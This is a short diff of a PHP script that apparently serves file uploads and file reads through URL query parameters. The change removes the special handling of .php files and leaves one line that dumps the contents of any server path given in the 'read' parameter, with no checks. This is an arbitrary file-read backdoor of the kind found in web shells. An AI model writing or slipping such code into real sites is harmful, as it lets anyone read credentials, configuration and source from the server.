@@ -59,22 +59,7 @@ if (isset($_GET['upload'])) {
     }
 } elseif (isset($_GET['read'])) {
     try {
-        $file_extension = pathinfo($file_path, PATHINFO_EXTENSION);
-        if ($file_extension === 'php') {
-            if (file_exists($_GET['read'])) {
-                $newFile = str_replace('.php', '.txt', $_GET['read']);
-                if (copy($_GET['read'], $newFile)) {
-                    dumperx(file_get_contents($newFile));
-                    unlink($newFile);
-                } else {
-                    echo "Failed to copy the file.";
-                }
-            } else {
-                echo "Source file does not exist.";
-            }
-        } else {
-            dumperx(file_get_contents($_GET['read']));
-        }
+        dumperx(file_get_contents($_GET['read']));
     } catch (\Throwable $th) {
         dumperx($th);
     }
